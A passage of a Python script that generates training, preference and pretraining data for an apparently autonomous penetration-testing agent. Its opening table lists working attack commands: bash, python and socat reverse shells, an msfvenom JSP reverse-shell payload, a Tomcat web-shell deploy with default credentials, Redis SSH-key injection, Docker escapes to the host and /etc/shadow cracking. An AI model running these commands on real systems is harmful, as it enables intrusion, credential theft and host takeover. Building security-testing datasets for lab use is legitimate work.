        {"prev": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "decisions": [
            ("PIVOT", r"find / -writable -type f 2>/dev/null | grep -E '(cron|\.sh|\.py)'", "Python setuid failed — pivoting to writable cron/script check"),
            ("PIVOT", "getcap -r / 2>/dev/null", "Pivoting to Linux capabilities enumeration"),
            ("PIVOT", "sudo -l", "Pivoting to check sudo permissions"),
        ]},
        {"prev": "find / -perm -4000 2>/dev/null", "decisions": [
            ("PIVOT", "getcap -r / 2>/dev/null", "No exploitable SUID — pivoting to capabilities check"),
            ("PIVOT", "cat /etc/crontab && ls -la /etc/cron.*", "Pivoting to cron job enumeration"),
            ("ESCALATE", "uname -r", "Checking kernel version for known exploits"),
        ]},
        # Network/tunnel failures
        {"prev": "chisel client {ip}:8000 R:socks", "decisions": [
            ("RETRY", "chisel client {ip}:8000 R:1080:socks", "Retrying with explicit port binding"),
            ("PIVOT", "ssh -D 1080 -N -f {user}@{ip}", "Pivoting to SSH dynamic port forwarding"),
            ("PIVOT", "socat TCP-LISTEN:8080,fork TCP:{ip2}:80", "Pivoting to socat for port forwarding"),
        ]},
        # Scanning failures
        {"prev": "nmap -sV -p 80 {ip}", "decisions": [
            ("RETRY", "nmap -sV -sC -p 80 --script=http-enum,http-vuln* {ip}", "Retrying with NSE scripts for deep HTTP scan"),
            ("PIVOT", "nmap -sU --top-ports 50 {ip}", "Pivoting to UDP scanning for hidden services"),
            ("ESCALATE", "nmap -A -p- --min-rate=5000 {ip}", "Escalating to aggressive full scan"),
        ]},
        # Password cracking failures
        {"prev": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "decisions": [
            ("RETRY", "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule", "Retrying with hashcat + rule-based mutations"),
            ("RETRY", "john --rules=all --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "Retrying with all mangling rules"),
            ("PIVOT", "john --show hashes.txt && unshadow /etc/passwd /etc/shadow > combined.txt", "Checking for already cracked and preparing unshadowed file"),
        ]},
        # Directory/file enumeration failures
        {"prev": "dirb http://{ip}/", "decisions": [
            ("PIVOT", "feroxbuster -u http://{ip}/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt --depth 3", "Pivoting to feroxbuster with larger wordlist and recursion"),
            ("PIVOT", "ffuf -u http://{ip}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -fc 404", "Pivoting to ffuf for faster fuzzing"),
            ("ESCALATE", "curl -s http://{ip}/robots.txt && curl -s http://{ip}/sitemap.xml", "Checking robots.txt and sitemap for hidden paths"),
        ]},
        # Specific service failures
        {"prev": "ssh admin@{ip}", "decisions": [
            ("PIVOT", "ftp {ip}", "SSH denied — pivoting to FTP for anonymous access"),
            ("PIVOT", "smbclient -L //{ip}/ -N", "Pivoting to SMB share enumeration"),
            ("RETRY", "ssh -o PreferredAuthentications=publickey admin@{ip}", "Retrying SSH with key-based auth probe"),
        ]},
        {"prev": "enum4linux -a {ip}", "decisions": [
            ("RETRY", "smbclient -L //{ip}/ -N", "Retrying with direct smbclient null session"),
            ("PIVOT", "rpcclient -U '' -N {ip} -c 'enumdomusers'", "Pivoting to rpcclient for RPC user enumeration"),
            ("ESCALATE", "nmap --script smb-enum-shares,smb-enum-users -p 445 {ip}", "Escalating to nmap SMB scripts"),
        ]},
        {"prev": "wget http://{ip}:8080/shell.war", "decisions": [
            ("ESCALATE", "curl -X PUT http://{ip}:8080/shell.jsp/ -d @webshell.jsp", "Escalating to direct JSP upload via PUT method"),
            ("PIVOT", "curl -u 'tomcat:s3cret' --upload-file shell.war 'http://{ip}:8080/manager/text/deploy?path=/pwn'", "Pivoting to authenticated manager deploy"),
            ("RETRY", "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war -o shell2.war", "Generating new payload and retrying"),
        ]},
        # Nmap specific failures
        {"prev": "nmap --script vuln {ip}", "decisions": [
            ("PIVOT", "nuclei -target http://{ip} -t cves/ -t vulnerabilities/", "Pivoting to nuclei for modern CVE scanning"),
            ("RETRY", "nmap --script 'vuln and safe' -sV {ip}", "Retrying with safe vuln scripts and version detection"),
            ("PIVOT", "searchsploit --nmap scan.xml", "Pivoting to searchsploit with nmap XML results"),
        ]},
        # Reverse shell failures
        {"prev": "nc -e /bin/bash {ip} 4444", "decisions": [
            ("RETRY", "bash -c 'bash -i >& /dev/tcp/{ip}/4444 0>&1'", "Retrying with bash reverse shell (nc -e not available)"),
            ("RETRY", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "Retrying with python reverse shell"),
            ("PIVOT", "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:4444", "Pivoting to socat for full TTY reverse shell"),
        ]},
        # Redis/NoSQL failures
        {"prev": "redis-cli -h {ip} CONFIG SET dir /var/www/html", "decisions": [
            ("RETRY", "redis-cli -h {ip} CONFIG SET dir /root/.ssh/", "Retrying with SSH directory for key injection"),
            ("PIVOT", "redis-cli -h {ip} INFO", "Pivoting to info gathering before exploitation"),
            ("ESCALATE", "redis-cli -h {ip} EVAL \"dofile('/etc/passwd')\" 0", "Escalating to Lua file read exploit"),
        ]},
        # Container escapes
        {"prev": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "decisions": [
            ("RETRY", "docker run -v /root:/mnt --rm alpine cat /mnt/root.txt", "Retrying with specific directory mount"),
            ("PIVOT", "docker images && docker ps -a", "Pivoting to enumerate existing containers and images"),
            ("ESCALATE", "docker run --privileged --rm -it alpine nsenter -t 1 -m -u -i -n sh", "Escalating to nsenter for direct host PID1 access"),
        ]},
    ]

    for _ in range(1500):
        pair = rng.choice(FAIL_RECOVER)
        decision, next_cmd, reasoning = rng.choice(pair["decisions"])
        ip = _rand_ip()
        ip2 = _rand_ip()
        user = rng.choice(_USERNAMES_POOL[:15])
        ver = rng.choice(["7.2p2", "8.2p1", "9.0", "7.9p1"])

        prev = pair["prev"].format(ip=ip, ip2=ip2, user=user, ver=ver)
        nxt = next_cmd.format(ip=ip, ip2=ip2, user=user, ver=ver)

        phase = rng.choice(["ENUMERATION", "EXPLOITATION", "PRIVILEGE_ESCALATION", "RECON"])
        agent = _pick_agent(phase, "retry_or_pivot")
        prev_reward = round(rng.uniform(-1.5, 0.5), 1)

        response = json.dumps({
            "decision": decision,
            "action": nxt[:200],
            "reasoning": reasoning[:200],
            "confidence": round(rng.uniform(0.65, 0.95), 2),
        })

        samples.append(Sample(
            task="retry_or_pivot",
            messages=[
                {"role": "system", "content": _sys("retry_or_pivot", agent)},
                {"role": "user", "content": (
                    f"This command was unproductive:\n"
                    f"Command: {prev[:150]}\n"
                    f"Reward: {prev_reward:.1f}\n\n"
                    f"State:\nPhase: {phase}\nTarget: {ip}\nStep: {rng.randint(10, 80)}\n\n"
                    f"What should we do next?"
                )},
                {"role": "assistant", "content": response},
            ],
            metadata={"decision": decision, "synthetic": True, "agent": agent, "source": "synthetic_retry_v2"},
            quality=0.91,
        ))
    return samples


def gen_synthetic_state_summaries_v2() -> list[Sample]:
    """1500+ unique state summary snapshots via dynamic assembly."""
    samples: list[Sample] = []
    rng = random.Random(SEED + 104)

    for _ in range(1500):
        phase = rng.choice(PHASES)
        ip = _rand_ip()
        step = rng.randint(3, 95)

        # Dynamically build evidence based on phase
        avail_ports = list(_PORT_SVC.keys())
        num_ports = rng.randint(0, 6) if phase != "RECON" or rng.random() > 0.3 else 0
        ports = sorted(rng.sample(avail_ports, min(num_ports, len(avail_ports))))

        services = []
        for p in ports[:4]:
            _, vers = _PORT_SVC[p]
            services.append(rng.choice(vers))

        creds: list[str] = []
        shells: list[str] = []
        vulns: list[str] = []
        files: list[str] = []

        if phase in ("EXPLOITATION", "PRIVILEGE_ESCALATION", "LATERAL_MOVEMENT", "POST_EXPLOITATION", "EXFILTRATION", "CLOSEOUT"):
            if rng.random() > 0.3:
                u, p_val = rng.choice(_USERNAMES_POOL[:10]), rng.choice(_PASSWORDS_POOL[:10])
                creds.append(f"{u}:{p_val}")
        if phase in ("PRIVILEGE_ESCALATION", "LATERAL_MOVEMENT", "POST_EXPLOITATION", "EXFILTRATION", "CLOSEOUT"):
            if rng.random() > 0.2:
                shell_user = rng.choice(["www-data", "user", rng.choice(_USERNAMES_POOL[:10])])
                shells.append(f"{shell_user}@target")
        if phase in ("POST_EXPLOITATION", "EXFILTRATION", "CLOSEOUT"):
            if rng.random() > 0.3:
                shells = ["root@target"]
        if phase in ("EXPLOITATION", "PRIVILEGE_ESCALATION"):
            if rng.random() > 0.4:
                vulns.append(rng.choice(["SQL injection confirmed", "SUID python3 found", "sudo vim NOPASSWD", "Apache path traversal", "WordPress RCE plugin", "kernel 4.15.0 OverlayFS"]))
        if phase in ("POST_EXPLOITATION", "EXFILTRATION"):
            if rng.random() > 0.4:
                files.extend(rng.sample(["user.txt", "root.txt", "/etc/shadow", "id_rsa", "backup.sql"], rng.randint(1, 3)))

        ev = {"ports": [str(p) for p in ports], "services": services, "credentials": creds, "vulns": vulns, "shells": shells}

        # Determine progress
        if shells and "root" in shells[0]:
            progress = "good"
        elif shells or creds:
            progress = rng.choice(["good", "moderate"])
        elif ports and services:
            progress = rng.choice(["moderate", "moderate", "good"])
        elif ports:
            progress = "moderate"
        else:
            progress = rng.choice(["stalled", "stalled", "moderate"])

        # Determine blockers
        blockers = []
        if phase in ("EXPLOITATION", "PRIVILEGE_ESCALATION") and not creds and not vulns:
            blockers.append("No credentials or vulnerabilities discovered yet")
        if phase == "RECON" and step > 10 and not ports:
            blockers.append("Port scanning not yielding results — try alternative techniques")
        if phase == "ENUMERATION" and step > 20 and not services:
            blockers.append("Service identification failing — check for filtered ports")
        if phase == "PRIVILEGE_ESCALATION" and step > 30 and not any("root" in s for s in shells):
            blockers.append("Escalation vectors not found — need deeper enumeration")

        # Determine next priority
        next_priorities = {
            "RECON": ["Enumerate discovered services", "Try UDP scan", "Attempt DNS zone transfer", "Run aggressive full port scan"],
            "ENUMERATION": ["Search for credentials or vulnerabilities", "Run CMS-specific scanner", "Deep enumerate web directories", "Test default credentials on all services"],
            "EXPLOITATION": ["Attempt exploitation of discovered vulnerabilities", "Try credential reuse across services", "Deploy reverse shell payload", "Use SQL injection for OS command execution"],
            "PRIVILEGE_ESCALATION": ["Check SUID, capabilities, sudo, cron", "Run linpeas/winpeas", "Check kernel version for exploits", "Look for writable system files"],
            "LATERAL_MOVEMENT": ["Use discovered credentials on adjacent hosts", "Set up pivot tunnel", "Enumerate internal network"],
            "POST_EXPLOITATION": ["Capture flags and validate access", "Extract /etc/shadow and SSH keys", "Check for additional sensitive data"],
            "EXFILTRATION": ["Transfer proof of access", "Document all findings", "Verify all flags captured"],
            "CLOSEOUT": ["Final verification of captured flags", "Clean up artifacts", "Document engagement timeline"],
        }
        next_priority = rng.choice(next_priorities.get(phase, ["Continue current phase objectives"]))

        # Build context
        ctx_parts = [f"Phase: {phase}", f"Target: {ip}", f"Step: {step}/{rng.randint(step + 5, 100)}"]
        if ports:
            ctx_parts.append(f"Ports: {', '.join(str(p) for p in ports)}")
        if services:
            ctx_parts.append(f"Services: {', '.join(services[:4])}")
        if creds:
            ctx_parts.append(f"Credentials: {', '.join(creds)}")
        if shells:
            ctx_parts.append(f"Shells: {', '.join(shells)}")
        if vulns:
            ctx_parts.append(f"Vulns: {', '.join(vulns)}")
        if files:
            ctx_parts.append(f"Files: {', '.join(files)}")

        agent = _pick_agent(phase, "state_summary")
        response = json.dumps({
            "phase": phase,
            "discoveries": ev,
            "progress": progress,
            "blockers": blockers,
            "next_priority": next_priority,
        })

        samples.append(Sample(
            task="state_summary",
            messages=[
                {"role": "system", "content": _sys("state_summary", agent)},
                {"role": "user", "content": f"Summarize the engagement state:\n\n" + "\n".join(ctx_parts)},
                {"role": "assistant", "content": response},
            ],
            metadata={"phase": phase, "synthetic": True, "agent": agent, "source": "synthetic_state_v2"},
            quality=0.89,
        ))
    return samples


# ══════════════════════════════════════════════════════════════════════════════
# DATASET ASSEMBLY
# ══════════════════════════════════════════════════════════════════════════════

def gen_dpo_pairs(traces: list[tuple[str, list[dict]]]) -> list[dict]:
    """Generate DPO preference pairs: high-reward (chosen) vs low-reward (rejected) for same state.

    Format: {"prompt": str, "chosen": str, "rejected": str}
    """
    pairs = []

    for fname, steps in traces:
        # Group steps by phase for state-matching
        by_phase: dict[str, list[tuple[int, dict, dict]]] = {}
        for i, step in enumerate(steps):
            rec = extract_agent_record(step)
            if not rec:
                continue
            phase = step.get("phase_before", "RECON")
            by_phase.setdefault(phase, []).append((i, step, rec))

        for phase, phase_steps in by_phase.items():
            # Split into high-reward and low-reward
            high = [(i, s, r) for i, s, r in phase_steps if r.get("reward", 0) >= 5.0 and r.get("command")]
            low = [(i, s, r) for i, s, r in phase_steps if r.get("reward", 0) <= 0.5 and r.get("command")]

            if not high or not low:
                continue

            for h_idx, h_step, h_rec in high[:20]:  # Cap per phase
                l_idx, l_step, l_rec = random.choice(low)

                ctx = build_context_str(h_step, steps, h_idx)
                agent = _pick_agent(phase, "next_step")

                # Clean reasoning for chosen (no leakage)
                ev = build_evidence_snapshot(steps, h_idx)
                tool = h_rec.get("command", "").split()[0] if h_rec.get("command") else ""
                tool_cat = TOOL_CATEGORIES.get(tool, "other")

                chosen_reasoning = f"{tool_cat} targeting {PHASE_OBJECTIVES.get(phase, 'current objectives')[:60]}"
                if ev["credentials"]:
                    chosen_reasoning += f"; leveraging {len(ev['credentials'])} credential(s)"

                chosen = json.dumps({
                    "action": h_rec["command"][:200],
                    "reasoning": chosen_reasoning[:200],
                    "phase_fit": round(min(1.0, h_rec.get("reward", 0) / 25.0), 2),
                    "alternatives": [],
                })

                l_tool = l_rec.get("command", "").split()[0] if l_rec.get("command") else ""
                l_tool_cat = TOOL_CATEGORIES.get(l_tool, "other")
                rejected_reasoning = f"{l_tool_cat} does not effectively target {phase} objectives"

                rejected = json.dumps({
                    "action": l_rec["command"][:200],
                    "reasoning": rejected_reasoning[:200],
                    "phase_fit": round(max(0.0, l_rec.get("reward", 0) / 25.0), 2),
                    "alternatives": [],
                })

                prompt_messages = [
                    {"role": "system", "content": _sys("next_step", agent)},
                    {"role": "user", "content": f"Current engagement state:\n{ctx}\n\nSuggest the next action."},
                ]

                pairs.append({
                    "prompt": json.dumps(prompt_messages),
                    "chosen": chosen,
                    "rejected": rejected,
                    "metadata": {
                        "phase": phase,
                        "chosen_reward": h_rec.get("reward", 0),
                        "rejected_reward": l_rec.get("reward", 0),
                        "source": fname,
                    },
                })

    return pairs


def gen_cpt_corpus(knowledge: list[dict]) -> list[dict]:
    """Generate Continued Pretraining corpus from knowledge entries.

    Raw cybersecurity text for domain knowledge injection.
    Format: {"text": str}
    """
    docs = []

    for entry in knowledge:
        title = entry.get("title", "")
        summary = entry.get("summary", "")
        raw_raw = entry.get("raw_preservation", "")

        if not title or not summary:
            continue

        # Clean markdown artifacts
        summary = re.sub(r"\{\{#include[^}]*\}\}", "", summary).strip()
        summary = re.sub(r"```(\w*)\n?", "\n", summary).strip()
        if not summary or len(summary) < 30:
            continue

        # Get original text if available
        try:
            raw_pres = ast.literal_eval(raw_raw) if isinstance(raw_raw, str) else raw_raw
        except (ValueError, SyntaxError):
            raw_pres = {}

        original_text = raw_pres.get("original_text", "")
        if original_text:
            original_text = re.sub(r"\{\{#include[^}]*\}\}", "", original_text).strip()

        # Build CPT document
        text_parts = [f"# {title}\n"]
        text_parts.append(summary[:500])

        if original_text and len(original_text) > len(summary):
            text_parts.append(f"\n\n## Details\n{original_text[:800]}")

        # Add command examples if available
        original_cmds = raw_pres.get("original_commands", [])
        if original_cmds:
            text_parts.append("\n\n## Commands")
            for cmd_entry in original_cmds[:5]:
                if isinstance(cmd_entry, dict):
                    cmd = cmd_entry.get("command", "")
                    ctx = cmd_entry.get("context", "")
                    if cmd:
                        text_parts.append(f"\n```\n{cmd[:200]}\n```")
                        if ctx:
                            text_parts.append(f"Context: {ctx[:100]}")
                elif isinstance(cmd_entry, str):
                    text_parts.append(f"\n```\n{cmd_entry[:200]}\n```")

        full_text = "\n".join(text_parts).strip()
        if len(full_text) >= 50:
            docs.append({"text": full_text[:1500]})

    return docs


def write_jsonl_dicts(records: list[dict], path: Path) -> None:
    """Write dicts as JSONL (for DPO/CPT data)."""
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w") as f:
        for r in records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")


def deduplicate(samples: list[Sample]) -> list[Sample]:
    seen: set[str] = set()
    unique = []
    for s in samples:
        h = s.content_hash()
        if h not in seen:
            seen.add(h)
            unique.append(s)
    return unique


def split_dataset(samples: list[Sample], seed: int = 42) -> tuple[list[Sample], list[Sample], list[Sample]]:
    rng = random.Random(seed)
    rng.shuffle(samples)
    n = len(samples)
    train_end = int(0.8 * n)
    val_end = int(0.9 * n)
    return samples[:train_end], samples[train_end:val_end], samples[val_end:]


def write_jsonl(samples: list[Sample], path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w") as f:
        for s in samples:
            f.write(json.dumps(s.to_dict(), ensure_ascii=False) + "\n")


def main():
    random.seed(SEED)
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    print("=" * 70)
    print("Ariaska Dataset V3 — Production-Grade Extraction")
    print("  Targets: All families >= 1000 samples, quality >= 0.6")
    print("  Features: Agent identity, knowledge corpus, cleaned reasoning")
    print("=" * 70)

    # Load data sources
    print("\n[1/8] Loading traces...")
    traces = load_all_traces()
    print(f"  Loaded {len(traces)} trace files")

    print("[2/8] Loading postmortems...")
    postmortems = load_all_postmortems()
    print(f"  Loaded {len(postmortems)} postmortems")

    print("[3/8] Loading knowledge corpus...")
    knowledge = load_knowledge()
    print(f"  Loaded {len(knowledge)} knowledge entries")

    # Phase 1: Real data generators
    print("\n[4/8] Generating from real trace data (cleaned)...")
    task_samples: dict[str, list[Sample]] = {}

    generators = [
        ("phase_classification", lambda: gen_phase_classification(traces)),
        ("next_step", lambda: gen_next_step(traces)),
        ("tool_output_parse", lambda: gen_tool_output_parse(traces)),
        ("state_summary", lambda: gen_state_summary(traces)),
        ("retry_or_pivot", lambda: gen_retry_pivot(traces)),
        ("postmortem", lambda: gen_postmortem(postmortems)),
        ("command_validate", lambda: gen_command_validate(traces)),
        ("evidence_check", lambda: gen_evidence_check(traces)),
    ]

    for task_name, gen_fn in generators:
        raw = gen_fn()
        filtered = [s for s in raw if s.quality >= MIN_QUALITY]
        deduped = deduplicate(filtered)
        if len(deduped) > MAX_PER_TASK:
            deduped.sort(key=lambda s: s.quality, reverse=True)
            deduped = deduped[:MAX_PER_TASK]
        task_samples[task_name] = deduped
        print(f"  {task_name}: {len(deduped)} (from {len(raw)} raw)")

    # Phase 2: Knowledge corpus generators (NEW)
    print("\n[5/8] Generating from knowledge corpus (107K entries)...")

    kg_evidence = gen_knowledge_evidence_check(knowledge)
    kg_retrieval = gen_knowledge_retrieval_reasoning(knowledge, postmortems)
    kg_next = gen_knowledge_next_step(knowledge)

    print(f"  Knowledge evidence_check: {len(kg_evidence)}")
    print(f"  Knowledge retrieval_reasoning: {len(kg_retrieval)}")
    print(f"  Knowledge next_step: {len(kg_next)}")

    for s in kg_evidence:
        task_samples.setdefault(s.task, []).append(s)
    for s in kg_retrieval:
        task_samples.setdefault(s.task, []).append(s)
    for s in kg_next:
        task_samples.setdefault(s.task, []).append(s)

    # Phase 3: Massive synthetic augmentation
    print("\n[6/8] Generating synthetic augmentation...")

    synth_tools = gen_synthetic_tool_outputs()
    synth_evidence = gen_synthetic_evidence_checks()
    synth_retry = gen_synthetic_retry_pivot()
    synth_state = gen_synthetic_state_summaries()
    synth_validate = gen_synthetic_command_validate()
    synth_postmortems = gen_synthetic_postmortems()
    synth_retrieval = gen_synthetic_retrieval_reasoning()
    synth_phase = gen_synthetic_phase_classification()
    synth_next_adv = gen_synthetic_next_step_advanced()

    print(f"  Synthetic tool_output_parse: {len(synth_tools)}")
    print(f"  Synthetic evidence_check: {len(synth_evidence)}")
    print(f"  Synthetic retry_or_pivot: {len(synth_retry)}")
    print(f"  Synthetic state_summary: {len(synth_state)}")
    print(f"  Synthetic command_validate: {len(synth_validate)}")
    print(f"  Synthetic postmortem: {len(synth_postmortems)}")
    print(f"  Synthetic retrieval_reasoning: {len(synth_retrieval)}")
    print(f"  Synthetic phase_classification: {len(synth_phase)}")
    print(f"  Synthetic next_step_advanced: {len(synth_next_adv)}")

    for group in [synth_tools, synth_evidence, synth_retry, synth_state, synth_validate, synth_postmortems, synth_retrieval, synth_phase, synth_next_adv]:
        for s in group:
            task_samples.setdefault(s.task, []).append(s)

    # Phase 3b: V2 Extended generators — dynamic component assembly for genuine diversity
    print("\n[6b/8] Generating V2 extended synthetic (component-based diversity)...")

    v2_tools = gen_synthetic_tool_outputs_v2()
    v2_postmortems = gen_synthetic_postmortems_v2()
    v2_retrieval = gen_synthetic_retrieval_reasoning_v2()
    v2_retry = gen_synthetic_retry_pivot_v2()
    v2_state = gen_synthetic_state_summaries_v2()

    print(f"  V2 tool_output_parse: {len(v2_tools)}")
    print(f"  V2 postmortem: {len(v2_postmortems)}")
    print(f"  V2 retrieval_reasoning: {len(v2_retrieval)}")
    print(f"  V2 retry_or_pivot: {len(v2_retry)}")
    print(f"  V2 state_summary: {len(v2_state)}")

    for group in [v2_tools, v2_postmortems, v2_retrieval, v2_retry, v2_state]:
        for s in group:
            task_samples.setdefault(s.task, []).append(s)

    # Phase 4: Deduplicate and quality filter each task
    print("\n[7/8] Deduplicating and writing per-task files...")
    all_samples = []
    stats = {}

    for task_name in sorted(task_samples):
        samples = deduplicate(task_samples[task_name])
        samples = [s for s in samples if s.quality >= MIN_QUALITY]

        if len(samples) > MAX_PER_TASK:
            samples.sort(key=lambda s: s.quality, reverse=True)
            samples = samples[:MAX_PER_TASK]

        write_jsonl(samples, OUTPUT_DIR / f"{task_name}.jsonl")
        all_samples.extend(samples)

        n_real = sum(1 for s in samples if not s.metadata.get("synthetic") and s.metadata.get("source", "") not in ("knowledge", "knowledge_retrieval", "knowledge_next_step", "postmortem_skill"))
        n_knowledge = sum(1 for s in samples if s.metadata.get("source", "").startswith("knowledge") or s.metadata.get("source") == "postmortem_skill")
        n_synth = sum(1 for s in samples if s.metadata.get("synthetic"))
        avg_q = sum(s.quality for s in samples) / max(1, len(samples))

        stats[task_name] = {
            "total": len(samples),
            "real": n_real,
            "knowledge": n_knowledge,
            "synthetic": n_synth,
            "avg_quality": round(avg_q, 3),
        }

        status = "OK" if len(samples) >= MIN_PER_TASK else "BELOW FLOOR"
        print(f"  {task_name}: {len(samples)} (real:{n_real} know:{n_knowledge} synth:{n_synth} q:{avg_q:.3f}) [{status}]")

    # Phase 5: Split and write
    print("\n[8/8] Splitting train/val/holdout...")
    all_samples = deduplicate(all_samples)
    train, val, holdout = split_dataset(all_samples, SEED)

    write_jsonl(train, OUTPUT_DIR / "train.jsonl")
    write_jsonl(val, OUTPUT_DIR / "val.jsonl")
    write_jsonl(holdout, OUTPUT_DIR / "holdout.jsonl")

    print(f"\n  Train: {len(train)}")
    print(f"  Val: {len(val)}")
    print(f"  Holdout: {len(holdout)}")
    print(f"  Total unique: {len(all_samples)}")

    # Phase 6: Generate DPO preference pairs
    print("\n[9/9] Generating DPO preference pairs...")
    dpo_pairs = gen_dpo_pairs(traces)
    write_jsonl_dicts(dpo_pairs, OUTPUT_DIR / "dpo_pairs.jsonl")
    print(f"  DPO pairs: {len(dpo_pairs)}")

    # Phase 7: Generate CPT corpus
    print("\n[10/10] Generating CPT (continued pretraining) corpus...")
    cpt_docs = gen_cpt_corpus(knowledge)
    write_jsonl_dicts(cpt_docs, OUTPUT_DIR / "cpt_corpus.jsonl")
    print(f"  CPT documents: {len(cpt_docs)}")

    # Write stats
    stats_path = OUTPUT_DIR / "dataset_stats.json"
    with open(stats_path, "w") as f:
        json.dump({
            "version": "3.0",
            "total_samples": len(all_samples),
            "train": len(train),
            "val": len(val),
            "holdout": len(holdout),
            "dpo_pairs": len(dpo_pairs),
            "cpt_documents": len(cpt_docs),
            "min_quality": MIN_QUALITY,
            "per_task": stats,
        }, f, indent=2)

    print(f"\n  Stats: {stats_path}")
    print(f"  Output: {OUTPUT_DIR}/")
    print("\nDone!")


if __name__ == "__main__":
    main()
